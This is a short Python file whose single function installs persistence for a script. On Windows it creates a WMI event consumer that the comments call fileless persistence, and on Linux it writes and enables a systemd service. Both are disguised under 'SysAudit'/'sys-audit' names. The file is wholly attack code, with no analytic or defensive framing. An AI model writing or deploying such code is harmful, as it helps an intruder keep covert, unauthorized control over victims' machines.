import os
import subprocess

def install_persistence():
    if os.name == 'nt':
        # WMI Fileless Persistence
        cmd = 'wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="SysAudit", CommandLineTemplate="python.exe C:\\path\\to\\main.py"'
        subprocess.run(cmd, shell=True)
    else:
        # Linux Systemd
        service = """[Unit]
Description=Audit
[Service]
ExecStart=/usr/bin/python3 /path/to/main.py
[Install]
WantedBy=multi-user.target"""
        with open("/etc/systemd/system/sys-audit.service", "w") as f:
            f.write(service)
        subprocess.run(["systemctl", "enable", "sys-audit.service"])
